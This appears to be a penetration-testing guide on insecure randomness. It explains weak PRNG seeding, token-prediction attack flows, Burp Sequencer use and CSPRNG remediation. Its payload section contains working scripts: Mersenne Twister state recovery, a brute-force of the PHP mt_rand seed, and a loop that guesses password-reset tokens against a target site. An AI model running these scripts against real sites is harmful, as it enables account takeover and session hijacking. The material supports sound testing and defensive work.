# Insecure Randomness

## Overview
Cryptographically secure randomness is essential for generating session tokens, password reset tokens, CSRF tokens, API keys, nonces, IVs, and encryption keys. Insecure randomness occurs when applications use non-cryptographic pseudo-random number generators (PRNGs) — such as `Math.random()` in JavaScript, `rand()` / `random()` in Python/PHP/C, or `java.util.Random` in Java — for security-sensitive values. These PRNGs are designed for speed and statistical distribution, not for unpredictability. An attacker who observes a few outputs from these generators can predict future outputs, allowing them to forge tokens, hijack sessions, or bypass authentication.

## How It Works
Non-cryptographic PRNGs work by maintaining an internal state and computing each output deterministically from that state. Common weaknesses:

1. **Predictable seed values:** Many PRNGs are seeded with the current timestamp (seconds or milliseconds). If an attacker knows approximately when a token was generated (e.g., from HTTP response headers or by triggering token generation themselves), they can try all possible seed values in a short time window and reproduce the token sequence.

2. **Small state space:** `java.util.Random` uses a 48-bit internal state. An attacker who observes a few output values can fully reconstruct the state and predict all future outputs.

3. **Math.random() in JavaScript:** Uses a 64-bit xorshift128+ algorithm. While the state space is larger, it is still not cryptographically unpredictable. Node.js `Math.random()` should never be used for security tokens.

4. **`random` module in Python:** `random.random()`, `random.choice()`, `random.randint()` use the Mersenne Twister, which has a state of 624 32-bit integers. After observing 624 consecutive 32-bit outputs, the entire state can be reconstructed and all future outputs predicted.

5. **Reuse of tokens:** Some applications generate a token once and reuse it, or rotate tokens on a predictable schedule.

**Attack flow:**
- Attacker requests a password reset for multiple accounts.
- Server generates reset tokens using `rand()` seeded with `time()`.
- Attacker observes their own reset token (from their email) and its timestamp.
- Attacker brute-forces seed values in the time window around their observed token.
- Attacker reconstructs the PRNG state and predicts tokens issued to other users.
- Attacker uses the predicted token to reset a victim's password.

## Impact
- Prediction of session tokens leading to session hijacking.
- Prediction of password reset tokens leading to account takeover without user interaction.
- Prediction of CSRF tokens leading to CSRF attacks bypassing CSRF protection.
- Prediction of API keys, allowing unauthorized API access.
- Prediction of cryptographic IVs (CBC mode), enabling plaintext recovery.
- Prediction of OTP codes (if generated with a PRNG instead of TOTP standard).
- Prediction of "random" discount codes, lottery numbers, or game outcomes.

## Where to Look
- **Password reset tokens:** the URL/token emailed to the user when they click "Forgot Password."
- **Session tokens / session IDs:** the `session` or `PHPSESSID` or `JSESSIONID` cookie.
- **CSRF tokens:** hidden form fields or header values.
- **Email verification tokens:** tokens in registration confirmation emails.
- **Invitation links:** unique registration invitation URLs.
- **API keys generated on-demand:** especially short keys or keys that look sequential.
- **Captcha challenges** generated without proper entropy.
- **Server-side code:** search for `Math.random()`, `rand()`, `random()`, `new Random()`, `mt_rand()`, `srand(time())`.
- **Token entropy analysis:** tokens that are short, all lowercase, contain only hex digits of insufficient length (< 128 bits), or appear sequential across multiple requests.

## Testing Steps
1. Generate multiple tokens in quick succession (e.g., trigger five password reset requests).
2. Analyze the token format and length: hex, Base64, UUID, numeric.
3. Calculate the entropy: token length × bits-per-character. Below 128 bits is a risk.
4. Check for sequential or predictable patterns across multiple tokens.
5. Look for timestamp-based tokens: if the token is a hash of `timestamp + email`, try to reproduce it.
6. Test UUID predictability: UUID v1 embeds a timestamp and MAC address — both semi-predictable.
7. Use `burp-randomness-tester` or Burp Sequencer to analyze statistical randomness of token samples.
8. Review source code for non-CSPRNG usage.
9. If you can generate tokens at a known time, attempt to brute-force the seed (especially for PHP `rand()`/`mt_rand()` seeded with `time()`).
10. Attempt to claim a predicted token against a victim account (only in authorized test environments).

## Payloads / Techniques

```python
# ===== MERSENNE TWISTER STATE RECOVERY (Python random module) =====
# After observing 624 consecutive 32-bit outputs, recover full PRNG state

import random

# Simulate observing 624 outputs from a PRNG (in a real attack these come from the server)
rng = random.Random(12345)
observed = [rng.getrandbits(32) for _ in range(624)]

# Reconstruct the PRNG state using the observed outputs
# (requires knowing the twister inversion algorithm — see randcrack library)
# pip install randcrack
from randcrack import RandCrack
rc = RandCrack()
for val in observed:
    rc.submit(val)

# Predict future values
print("Predicted next 5 values:")
for _ in range(5):
    print(rc.predict_getrandbits(32))

# Compare with actual future values from the original RNG
print("Actual next 5 values:")
for _ in range(5):
    print(rng.getrandbits(32))


# ===== PHP mt_rand() SEED BRUTE FORCE =====
# PHP mt_rand() seeded with time() is predictable within a small time window

import subprocess, time

def php_mt_rand(seed, count=1):
    """Call PHP to generate mt_rand values with a given seed."""
    code = f'<?php mt_srand({seed}); for($i=0;$i<{count};$i++) echo mt_rand()."\\n"; ?>'
    result = subprocess.run(['php', '-r', code.replace('<?php ', '').replace(' ?>', '')],
                            capture_output=True, text=True)
    return [int(x) for x in result.stdout.strip().split('\n')]

# Attacker's observed token value (from password reset email)
# If the token is simply mt_rand(), brute-force the seed
observed_token = 1234567890  # Replace with actual observed value

now = int(time.time())
for seed_candidate in range(now - 60, now + 1):  # Try 60-second window
    predictions = php_mt_rand(seed_candidate, 3)
    if observed_token in predictions:
        print(f"[!] Found seed: {seed_candidate}")
        print(f"    Future tokens: {predictions}")
        break


# ===== UUID v1 TIMESTAMP EXTRACTION =====
import uuid
from datetime import datetime

# UUID v1 embeds timestamp (100-nanosecond intervals since Oct 15, 1582)
def uuid1_to_datetime(uuid_str):
    u = uuid.UUID(uuid_str)
    if u.version != 1:
        return None
    timestamp = u.time
    # UUID timestamp is 100-nanosecond intervals since 1582-10-15
    delta = (timestamp - 0x01b21dd213814000) / 1e7  # seconds since Unix epoch
    return datetime.utcfromtimestamp(delta)

sample_uuid = "6ba7b810-9dad-11d1-80b4-00c04fd430c8"
print("UUID v1 timestamp:", uuid1_to_datetime(sample_uuid))


# ===== TOKEN ENTROPY ANALYSIS =====
import math, re, collections

def estimate_entropy(token):
    """Estimate bit entropy of a token string."""
    charset = 0
    if re.search(r'[0-9]', token): charset += 10
    if re.search(r'[a-z]', token): charset += 26
    if re.search(r'[A-Z]', token): charset += 26
    if re.search(r'[^a-zA-Z0-9]', token): charset += 32
    if charset == 0: return 0
    bits = len(token) * math.log2(charset)
    return bits

tokens = [
    "a3f2c1",              # 6 hex chars = ~24 bits — VERY WEAK
    "5a8b3c2d9e4f1a6b",    # 16 hex chars = ~64 bits — WEAK
    "3d7e2a1f9b4c6e0d5f8a2b1c7e9d3a6f",  # 32 hex chars = ~128 bits — OK
]
for t in tokens:
    print(f"Token: {t[:20]}... | Estimated entropy: {estimate_entropy(t):.1f} bits")


# ===== TIMING-BASED TOKEN PREDICTION =====
import requests, hashlib, time

# Some apps generate reset tokens as: SHA1(email + timestamp)
email = "victim@example.com"
now = int(time.time())

for ts in range(now - 10, now + 10):
    candidate = hashlib.sha1(f"{email}{ts}".encode()).hexdigest()
    # Check if this token is valid (only in authorized tests)
    r = requests.get(f"https://target.example.com/reset?token={candidate}")
    if "Token valid" in r.text or r.status_code == 200:
        print(f"[!] Valid token found! Timestamp: {ts}, Token: {candidate}")
        break
```

```bash
# ===== BURP SEQUENCER ANALYSIS =====
# Capture 100+ session tokens or reset tokens in Burp Proxy
# Send the request to Burp Sequencer
# In Sequencer, click "Start live capture" and collect 200+ samples
# After capture, Burp computes FIPS tests and reports effective key length
# Result < 80 bits effective entropy = potential vulnerability

# Collect multiple password reset tokens via curl
for i in $(seq 1 20); do
  curl -s -X POST https://target.example.com/forgot-password \
    -d "email=attacker${i}@attacker.com" \
    -c /tmp/cookies_${i}.txt \
    -b /tmp/cookies_${i}.txt \
    | grep -oE 'token=[a-zA-Z0-9]{10,}' | head -1
  sleep 0.1
done

# Check token lengths and character sets
# Short tokens (< 20 chars), all-numeric, or all-hex tokens are red flags

# Test if tokens look sequential
# Token 1: 00004821
# Token 2: 00004822  <-- sequential = trivially predictable
```

## Burp Suite Tips
- Use **Burp Sequencer** to analyze the entropy of session tokens or CSRF tokens. Send a token-generating request to Sequencer (right-click in Proxy History > "Send to Sequencer"), then capture at least 200 token samples. Burp performs FIPS 140-2 statistical tests and reports the "effective key length" in bits. Anything below 80 bits indicates insufficient entropy.
- In **Repeater**, trigger the same action (e.g., forgot password) multiple times rapidly and compare the returned tokens — look for sequential patterns or tokens that share substrings.
- Use **Burp's Decoder** (Hex view) to inspect token byte distributions. Structured or non-random byte distributions indicate PRNG output.
- The **Turbo Intruder** extension can rapidly generate many token requests for bulk collection.
- In **Intruder > Payloads**, use a **Number** payload type with a small sequential range to test if session IDs or reset tokens are numerically sequential.
- Install the **Param Miner** BApp to identify hidden token parameters that may use weaker randomness than visible tokens.

## Tools
- Burp Suite Sequencer (built-in randomness analyzer)
- randcrack — https://github.com/tna0y/Python-random-module-cracker
- php_mt_seed — https://www.openwall.com/php_mt_seed/ (PHP mt_rand seed finder)
- FOCA (token extraction from metadata)
- hashcat (brute-forcing seed-based tokens)
- Python (randcrack, analysis scripts)
- CyberChef — https://gchq.github.io/CyberChef/ (token decoding and analysis)
- jwt_tool (if randomness affects JWT secret strength)

## Remediation
- Use only Cryptographically Secure PRNGs (CSPRNGs) for all security-sensitive values:
  - Python: `secrets.token_hex(32)`, `secrets.token_urlsafe(32)`, `os.urandom(32)`
  - Node.js: `crypto.randomBytes(32)`, `crypto.randomUUID()`
  - PHP: `random_bytes(32)`, `bin2hex(random_bytes(32))` (PHP 7+), `openssl_random_pseudo_bytes(32)`
  - Java: `java.security.SecureRandom`, not `java.util.Random`
  - C/C++: `getrandom()` (Linux), `BCryptGenRandom()` (Windows)
- Generate tokens of at least 128 bits (32 hex characters or 22 Base64 characters) of true cryptographic randomness.
- Do not derive tokens from predictable inputs (timestamp, user ID, email) without a proper CSPRNG-based MAC.
- Never seed a PRNG with the current timestamp.
- Implement token expiration: password reset tokens should expire within 15–60 minutes and be single-use.
- Use constant-time comparison when validating tokens to prevent timing attacks.
- Audit all token generation code as part of security review checklists.

## References
https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html
https://owasp.org/www-community/vulnerabilities/Insecure_Randomness
https://portswigger.net/web-security/authentication/other-mechanisms
https://docs.python.org/3/library/secrets.html
https://nodejs.org/api/crypto.html#cryptorandombytessize-callback
https://www.php.net/manual/en/function.random-bytes.php
https://www.openwall.com/php_mt_seed/
https://github.com/tna0y/Python-random-module-cracker
